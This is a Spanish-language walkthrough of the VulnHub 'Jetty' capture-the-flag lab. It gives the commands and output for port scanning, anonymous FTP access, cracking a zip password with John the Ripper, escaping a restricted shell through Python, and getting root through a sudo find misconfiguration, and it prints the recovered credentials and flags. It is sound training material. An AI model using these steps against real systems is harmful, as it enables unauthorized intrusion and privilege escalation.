---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Jetty VulnHub

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-24 05:41 EDT
Nmap scan report for 192.168.5.201
Host is up (0.00070s latency).

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.5.175
|      Logged in as ftp
|      TYPE: ASCII
|      Session bandwidth limit in byte/s is 2048000
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rwxrwxrwx    1 ftp      ftp           306 Oct 06  2018 README.txt [NSE: writeable]
|_-rwxrwxrwx    1 ftp      ftp           226 Oct 06  2018 sshpass.zip [NSE: writeable]
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 4 disallowed entries 
|_/dir/ /passwords/ /facebook_photos /admin/secret
65507/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a0:5b:e6:bb:fd:f6:02:ec:f0:bd:a1:be:b8:97:84:ba (RSA)
|   256 e9:d3:50:26:7e:5a:c2:a0:b0:89:c9:f4:64:d8:aa:b0 (ECDSA)
|_  256 2e:67:c1:af:cc:22:5c:59:15:5f:97:f7:2e:1b:e0:93 (ED25519)
MAC Address: 00:0C:29:39:5C:73 (VMware)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.10 seconds
```

### ftp

```shell
ftp anonymous@<IP>
```

Nos encontraremos con 2 archivos...

```shell
get README.txt

get sshpass.zip
```

El archivo `README.txt` contiene lo siguiente...

```
Hi Henry, here you have your ssh's password. As you can see the file is encrypted with the default company's password. 
Please, once you have read this file, run the following command on your computer to close the FTP server on your side. 
IT IS VERY IMPORTANT!! CMD: service ftp stop. 

Regards, Michael.
```

No da una pista de que el `.zip` esta protegido por una contraseña y contiene la contraseña del `ssh` del usuario `Henry`...

Por lo que haremos lo siguiente...

```shell
zip2john sshpass.zip > hash
```

Info:

```
ver 1.0 efh 5455 efh 7875 sshpass.zip/sshpass.txt PKZIP Encr: 2b chk, TS_chk, cmplen=38, decmplen=26, crc=CA21C815 ts=45E9 cs=45e9 type=0
```

```shell
john --wordlist=<WORDLIST> hash
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
seahorse!        (sshpass.zip/sshpass.txt)     
1g 0:00:00:00 DONE (2024-06-24 05:47) 1.612g/s 2114Kp/s 2114Kc/s 2114KC/s sharda16..saytown
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Veremos la contraseña que decomprime el `.zip` del `ssh`...

```shell
unzip sshpass.zip
```

Y metemos la contraseña `seahorse!`...

Nos dara un archivo llamado `sshpass.txt` que contiene lo siguiente...

```
Squ1d4r3Th3B3$t0fTh3W0rLd
```

### Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt,md -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.201/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              md,html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.md         (Status: 403) [Size: 300]
/.htaccess.html       (Status: 403) [Size: 302]
/.htaccess.php        (Status: 403) [Size: 301]
/.htaccess.txt        (Status: 403) [Size: 301]
/.htaccess            (Status: 403) [Size: 297]
/.htpasswd            (Status: 403) [Size: 297]
/.htpasswd.php        (Status: 403) [Size: 301]
/.htpasswd.html       (Status: 403) [Size: 302]
/.htpasswd.txt        (Status: 403) [Size: 301]
/.htpasswd.md         (Status: 403) [Size: 300]
/index.html           (Status: 200) [Size: 23]
/recoverpassword.txt  (Status: 200) [Size: 1029]
/robots.txt           (Status: 200) [Size: 104]
/robots.txt           (Status: 200) [Size: 104]
/server-status        (Status: 403) [Size: 301]
Progress: 102345 / 102350 (100.00%)
===============================================================
Finished
===============================================================
```

Pero poca cosa, si vamos a la descripcion de VulnHub en la que nos detalla el sistema, veremos lo siguiente...

```
Extra information:

- The suspicious username is Squiddie.
- He was in charge of the ticket selling for the Aquarium.
- Ethernet settings set to NAT with DHCP enabled.
- You should find the IP in your VLAN.
```

Y si probamos el nombre de usuario `squiddie` en el `ssh` con la contraseña encontrada anteriormente, veremos que es esa...

```
User = squiddie
Password = Squ1d4r3Th3B3$t0fTh3W0rLd
```

```shell
ssh squiddie@<IP> -p 65507
```

Una vez dentro veremos que tenemos restringido casi todo, pero si hacemos lo siguiente...

```shell
help
```

Info:

```
cd  clear  exit  help  history  lpath  ls  lsudo  pwd  python  whoami
```

Vemos que solo podemos hacer esos y el que nos interesa es el de `python`...

```shell
python
```

```python
import os
os.system('/bin/bash')
```

Poniendo eso dentro del entorno de `python` nos dara una shell de `bash` por lo que ya habriamos escapado y podremos hacer cualquier comando sin estar de forma restringida...

Leeremos la flag...

> user.txt (flag1)

```
dd69f649f3e5159ddd10b83b56b2dda2
```

Si hacemos `sudo -l` veremos lo siguiente...

```
Matching Defaults entries for squiddie on jetty:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User squiddie may run the following commands on jetty:
    (ALL) NOPASSWD: /usr/bin/find
```

Veremos que podemos hacer `find` como `root` por lo que haremos lo siguiente para ser `root`...

```shell
sudo find . -exec /bin/sh \; -quit
```

Y con esto ya seriamos `root`, por lo que leeremos la flag...

> proof.txt (flag2)

```
136d05d01c8af5d3e3520d2c270f91f1
```
